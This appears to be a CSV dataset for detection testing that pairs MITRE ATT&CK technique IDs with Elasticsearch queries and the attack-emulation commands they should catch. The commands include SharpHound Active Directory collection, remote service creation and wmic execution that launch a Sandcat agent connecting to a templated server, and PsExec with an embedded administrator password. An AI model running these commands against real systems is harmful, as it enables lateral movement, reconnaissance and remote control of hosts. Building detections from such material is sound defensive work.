T1059.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""wildcard"": {""CommandLine"": ""*DownloadString""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                      {""wildcard"": {""CommandLine"": ""*SharpHound.ps1""}},
                 {""match_phrase"": {""CommandLine"": ""Invoke-BloodHound""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","write-host ""Import and Execution of SharpHound.ps1 from PathToAtomicsFolder\T1059.001\src"" -ForegroundColor Cyan; 
import-module PathToAtomicsFolder\T1059.001\src\SharpHound.ps1;
Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5",2
T1569.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""create""}},
                {""match"": {""CommandLine"": ""start ""}},
                 {""match"": {""CommandLine"": ""sandsvc""}},
                 {""wildcard"": {""CommandLine"": ""s4ndc4t*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","sc.exe \\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= ""cmd /c start C:\Users\Public\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}"" displayname= ""Sandcat Execution"";
sc.exe \\#{remote.host.fqdn} start sandsvc;
Start-Sleep -s 15;
Get-Process -ComputerName #{remote.host.fqdn} s4ndc4t;",2
T1059.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""wordpad.exe""}},
                 {""match"": {""CommandLine"": ""for""}},
                 {""match"": {""CommandLine"": ""in""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","cmd /c ""for /l %x in (1,1,75) do start wordpad.exe /p $env:temp\T1059_003note.txt"" | out-null",2
T1047,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""s4ndc4t*""}},
                  {""match_phrase"": {""CommandLine"": ""process call create""}},
                  {""match"": {""CommandLine"": ""wmic""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","wmic /node:`""#{remote.host.fqdn}`"" /user:`""#{domain.user.name}`"" /password:`""#{domain.user.password}`"" process call create ""powershell.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}"";",
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Get-Process""}},
                {""match"": {""CommandLine"": ""powershell""}},
                {""match_phrase"": {""CommandLine"": ""Stop-Process""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Get-Process -Name ""powershell"" | Stop-Process",2
T1569.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""PsExec.exe""}},
                 {""match_phrase"": {""CommandLine"": ""calc.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\PSTools\PsExec.exe \\localhost -u DOMAIN\Administrator -p P@ssw0rd1 -accepteula ""C:\Windows\System32\calc.exe""",2
T1059.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""cscript*""}},
                 {""wildcard"": {""CommandLine"": ""*.vbs""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",cscript a771e6_sys_info.vbs > $env:TEMP\T1059.005.out.txt,2
T1047,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""user""}},
                        {""match"": {""CommandLine"": ""password""}},
                         {""match"": {""CommandLine"": ""node""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                     {""match_phrase"": {""CommandLine"": ""notepad.exe""}},
                 {""match"": {""CommandLine"": ""process""}},
                  {""wildcard"": {""CommandLine"": ""wmic*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",wmic process call create notepad.exe,2
T1047,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""rundll32""}},
                 {""match"": {""CommandLine"": ""wmic""}},
                   {""match"": {""CommandLine"": ""node""}},
                 {""match_phrase"": {""CommandLine"": ""calc.dll""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","wmic /node:127.0.0.1 process call create ""rundll32.exe $env:TEMP\calc.dll StartW""",2
T1047,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""wmic""}},
                 {""match_phrase"": {""CommandLine"": ""service where""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","wmic /node:""127.0.0.1"" service where (caption like ""%Spooler%"")

",2
T1047,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""wmic process get""}},
                         {""match_phrase"":{""CommandLine"": ""format:csv""}}        
    ]
     }
    },
    {""bool"":{
     ""should"":[
                       {""match_phrase"":{""CommandLine"": ""caption""}},
                       {""match_phrase"":{""CommandLine"": ""executablepath""}},
                       {""match_phrase"":{""CommandLine"": ""commandline""}}
                                                   ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic process get caption,executablepath,commandline /format:csv",2
T1059.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""echo""}},
                {""match"": {""CommandLine"": ""&gt;""}},
                  {""wildcard"": {""CommandLine"": ""*.bin""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","echo ""Hello from the Windows Command Prompt!"" > ""%TEMP%\test.bin"" & type ""%TEMP%\test.bin""",2
